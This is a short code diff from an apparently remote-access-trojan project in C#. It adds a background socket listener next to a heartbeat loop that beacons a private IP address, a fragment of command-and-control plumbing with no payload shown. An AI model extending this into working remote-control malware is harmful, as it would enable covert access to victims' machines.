@@ -21,6 +21,7 @@ namespace RAT
         }
         public static void HeartBeat()
         {
+            Task.Factory.StartNew(() => AsynchronousSocketListener.StartListening());
             while (true)
             {
                 Send("<HEARTBEAT> 192.168.0.45");
